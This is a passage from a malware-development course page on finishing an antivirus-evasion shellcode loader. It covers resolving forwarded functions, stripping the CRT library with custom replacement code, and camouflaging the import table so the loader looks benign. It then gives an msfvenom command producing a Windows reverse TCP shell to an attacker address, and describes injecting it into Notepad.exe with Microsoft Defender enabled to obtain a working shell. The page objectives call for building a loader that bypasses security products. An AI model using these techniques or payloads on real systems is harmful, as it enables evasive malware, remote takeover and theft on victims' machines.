<p><img src="Bypassing%20AVs_files/av-bypass-12.png" alt="image"></p>
<h4>Forwarded Functions</h4>
<p>The address being retrieved using <code>GetProcAddressH</code> does not lead to a function and instead points to the string "CRYPTSP.SystemFunction032". This indicates the presence of a <em>forwarded function</em>, where a function exported from one DLL (DLL A) is located in another DLL (DLL B). When using the original <code>GetProcAddress</code>
 WinAPI to fetch the address of this kind of function, additional logic 
is performed behind the scenes to retrieve the address in DLL B. This is
 all done seamlessly and therefore one may mistakenly assume that the 
function is exported from DLL A.</p>
<p>Therefore, instead of loading <code>Advapi32.dll</code> (DLL A) to find <code>SystemFunction032</code>, <code>Cryptsp.dll</code>
 (DLL B) should be loaded as it holds the actual address. This is 
indicated by the string "CRYPTSP.SystemFunction032", which provides a 
hint as to where the function is located. This is necessary because <code>GetProcAddressH</code> does not handle forwarded functions. By making this minor change, the code will now compile and execute successfully.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-13.png" alt="image"></p>
<h3>CRT Library Removal</h3>
<p>Following the steps outlined in the <em>CRT Library Removal &amp; Malware Compiling</em> module will enable the removal of the CRT Library. An error will arise because of the usage of <code>printf</code> and <code>wprintf</code>
 functions. To solve this, a custom function can be used to replace 
these functions. The printing functionality will only be enabled when 
debug mode is enabled. The <code>printf</code> and <code>wprintf</code> functions replacement should be saved in a new file called <code>Debug.h</code>, which must be included in all files that call <code>printf</code> or <code>wprintf</code>.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-14.png" alt="image"></p>
<p><strong>Debug.h</strong></p>
<pre><code>#pragma once

#include &lt;Windows.h&gt;

// uncomment to enable debug mode
//\
#define DEBUG



#ifdef DEBUG

// wprintf replacement
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  


// printf replacement
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  



#endif // DEBUG
</code></pre>
<pre><code>// Only print if debug mode is enabled
#ifdef DEBUG
	PRINTA("...");
#endif
</code></pre>
<p>If one attempts to compile after this, they will encounter more errors because <code>memcpy</code>, <code>memset</code>, <code>toupper</code>
 are also imported from the CRT library. To fix this issue, custom 
functions that will execute the same logic must be added and stored in <code>WinApi.c</code>, which is shown below.</p>
<p><strong>WinApi.c</strong></p>
<pre><code>CHAR _toUpper(CHAR C)
{
	if (C &gt;= 'a' &amp;&amp; C &lt;= 'z')
		return C - 'a' + 'A';

	return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
	for (volatile int i = 0; i &lt; Size; i++) {
		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
	}
	return Destination;
}



extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
	unsigned char* p = (unsigned char*)Destination;
	while (Size &gt; 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}
</code></pre>
<p>There is one final error to solve which is the undefined <code>_fltused</code> symbol. The <code>_fltused</code>
 symbol is a global variable in the CRT Library which is used to 
determine if floating-point operations were used in a program. By 
creating a new variable named <code>_fltused</code> and setting it to 
zero, the error will be resolved. This mirrors the initialization of the
 variable by the CRT Library, which will result in the compiler building
 the project with no errors.</p>
<h3>IAT Camouflage</h3>
<p>Adding the header file <code>IatCamouflage.h</code>, which contains the same code introduced in the <em>IAT Camouflage</em> module, should be done as a final step. <code>IatCamouflage.h</code> should be included in the <code>main.c</code>
 file only and called at the beginning of the main function, so that the
 import address table of the implementation will appear benign.</p>
<h3>Final Result</h3>
<p>This demonstration uses Msfvenom's reverse TCP shell payload which is generated via the command below.</p>
<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin
</code></pre>
<p><code>AV.exe</code>'s IAT is shown below.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-15.png" alt="image"></p>
<p>Next, <code>AV.exe</code> injects into <code>Notepad.exe</code> with Microsoft Defender enabled.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-16.png" alt="image"></p>
<p>A successful reverse shell is established to the attacking machine and a sample command is executed.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-17.png" alt="image"></p>
<p>The <code>Notepad.exe</code> process has PID 20288, which matches the PID in the previous picture.</p>
<p><img src="Bypassing%20AVs_files/av-bypass-18.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement a loader capable of bypassing Microsoft Defender and other security solutions</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Customize the loader to incorporate different techniques demonstrated in this course (e.g. PPID spoofing)</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/80"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/81/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/81/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/82"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Bypassing%20AVs_files/jquery-3.6.0.min.js"></script>
        <script src="Bypassing%20AVs_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Bypassing%20AVs_files/app.4474f4d1.css"><link rel="modulepreload" href="Bypassing%20AVs_files/app.5f3af5ce.js"><link rel="stylesheet" href="Bypassing%20AVs_files/app.4474f4d1.css"><script type="module" src="Bypassing%20AVs_files/app.5f3af5ce.js"></script><script src="Bypassing%20AVs_files/navbar.js"></script>
<script src="Bypassing%20AVs_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 81;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>